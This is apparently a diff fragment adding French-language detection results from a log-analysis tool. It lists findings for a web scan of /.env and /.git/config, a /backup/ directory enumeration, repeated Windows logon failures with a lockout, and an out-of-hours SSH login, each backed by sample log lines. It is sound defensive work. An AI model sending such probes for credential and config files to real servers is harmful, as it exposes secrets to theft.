+      "91.240.118.50 - - [11/Nov/2026:05:30:00 +0100] \"GET /.env HTTP/1.1\" 200 512 \"-\" \"curl/8.4.0\"",
+      "91.240.118.50 - - [11/Nov/2026:05:30:01 +0100] \"GET /.git/config HTTP/1.1\" 200 512 \"-\" \"curl/8.4.0\"",
+      "91.240.118.50 - - [11/Nov/2026:05:30:02 +0100] \"GET /wp-config.php.bak HTTP/1.1\" 404 322 \"-\" \"curl/8.4.0\"",
+      "91.240.118.50 - - [11/Nov/2026:05:30:05 +0100] \"GET /phpmyadmin/ HTTP/1.1\" 404 171 \"-\" \"curl/8.4.0\""
+    ]
+  },
+  {
+    "severity": "moyenne",
+    "category": "Scan web",
+    "title": "Recherche de fichiers sensibles depuis 203.0.113.99 (10 chemins, ex. /backup/, /backup1/, /backup2/, /backup3/)",
+    "source": "apache",
+    "ip": "203.0.113.99",
+    "user": null,
+    "count": 10,
+    "first_seen": "2026-11-11 09:15:00",
+    "last_seen": "2026-11-11 09:16:02",
+    "evidence": [
+      "203.0.113.99 - - [11/Nov/2026:09:15:00 +0100] \"GET /backup/ HTTP/1.1\" 404 406 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "203.0.113.99 - - [11/Nov/2026:09:15:07 +0100] \"GET /backup1/ HTTP/1.1\" 404 422 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "203.0.113.99 - - [11/Nov/2026:09:15:13 +0100] \"GET /backup2/ HTTP/1.1\" 404 332 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "203.0.113.99 - - [11/Nov/2026:09:15:20 +0100] \"GET /backup3/ HTTP/1.1\" 404 294 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "203.0.113.99 - - [11/Nov/2026:09:15:27 +0100] \"GET /backup4/ HTTP/1.1\" 404 455 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "203.0.113.99 - - [11/Nov/2026:09:15:33 +0100] \"GET /backup5/ HTTP/1.1\" 404 326 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "…"
+    ]
+  },
+  {
+    "severity": "moyenne",
+    "category": "Brute-force",
+    "title": "6 échecs de connexion depuis 10.0.0.22 (pic : 6 en 10 min) — comptes visés : mmartin (6)",
+    "source": "windows",
+    "ip": "10.0.0.22",
+    "user": "mmartin",
+    "count": 6,
+    "first_seen": "2026-11-11 09:30:00",
+    "last_seen": "2026-11-11 09:31:09",
+    "evidence": [
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=mmartin TargetDomainName=CORP LogonType=2 WorkstationName=PC-MMARTI IpAddress=10.0.0.22 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=mmartin TargetDomainName=CORP LogonType=2 WorkstationName=PC-MMARTI IpAddress=10.0.0.22 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=mmartin TargetDomainName=CORP LogonType=2 WorkstationName=PC-MMARTI IpAddress=10.0.0.22 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=mmartin TargetDomainName=CORP LogonType=2 WorkstationName=PC-MMARTI IpAddress=10.0.0.22 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=mmartin TargetDomainName=CORP LogonType=2 WorkstationName=PC-MMARTI IpAddress=10.0.0.22 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=mmartin TargetDomainName=CORP LogonType=2 WorkstationName=PC-MMARTI IpAddress=10.0.0.22 Status=0xc000006d SubStatus=0xc000006a"
+    ]
+  },
+  {
+    "severity": "moyenne",
+    "category": "Activité Windows",
+    "title": "Compte verrouillé : mmartin (SRV-FILES01.corp.local)",
+    "source": "windows",
+    "ip": null,
+    "user": "mmartin",
+    "count": 1,
+    "first_seen": "2026-11-11 09:31:11",
+    "last_seen": "2026-11-11 09:31:11",
+    "evidence": [
+      "EventID=4740 TargetUserName=mmartin TargetDomainName=CORP SubjectUserName=DC01$"
+    ]
+  },
+  {
+    "severity": "moyenne",
+    "category": "Connexion anormale",
+    "title": "Connexion hors horaires (7h-20h) de « alice » depuis 45.83.12.9 : 11/11 22:47",
+    "source": "auth",
+    "ip": "45.83.12.9",
+    "user": "alice",
+    "count": 1,
+    "first_seen": "2026-11-11 22:47:12",
+    "last_seen": "2026-11-11 22:47:12",
+    "evidence": [
+      "Nov 11 22:47:12 srv-web01 sshd[17532]: Accepted password for alice from 45.83.12.9 port 57627 ssh2"
+    ]
+  }
+]
